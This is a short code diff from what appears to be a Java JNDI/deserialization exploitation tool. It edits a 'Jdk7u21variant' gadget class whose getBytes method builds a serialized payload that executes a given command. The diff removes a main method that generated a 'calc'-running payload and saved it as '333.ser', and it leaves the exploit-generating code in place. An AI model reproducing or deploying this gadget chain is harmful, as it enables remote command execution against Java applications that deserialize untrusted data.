@@ -6,7 +6,6 @@ import com.nu1r.jndi.gadgets.utils.Reflections;
 
 import javax.xml.transform.Templates;
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.InvocationHandler;
 import java.rmi.MarshalledObject;
@@ -14,13 +13,6 @@ import java.util.HashMap;
 import java.util.LinkedHashSet;
 
 public class Jdk7u21variant {
-
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("333.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object templates = Gadgets.createTemplatesImpl(type, param);
